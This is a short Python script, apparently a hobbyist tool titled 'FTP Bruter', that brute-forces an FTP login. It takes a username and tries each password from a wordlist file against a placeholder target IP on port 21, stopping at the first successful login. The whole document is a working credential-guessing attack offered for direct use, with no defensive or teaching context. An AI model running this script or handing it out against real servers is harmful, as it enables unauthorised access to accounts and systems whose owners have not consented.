import ftplib, pyfiglet

banner = pyfiglet.figlet_format("FTP   Bruter")
print(banner, end="")
print("|"+"_"*19 + "@Yashparwal1" + "_"*19+"|")
print("\n")

def check(user,password):
    try:
        print(f"\nTrying {user}:{password} ...")
        ftp=ftplib.FTP()
        if ftp.connect("TARGET_IP_ADDRESS",21): #put your Target IP Address here
            ftp.login(user,password)
            print(f"Successlly Logged in: {user}:{password}")
        ftp.quit()
        return True
    except:
        return False
    
user = input('Enter the username: ')
passlist = open('pass.txt','r') #modify according to your wordlist
for password in passlist:
    if check(user,password.rstrip()) == True:
        break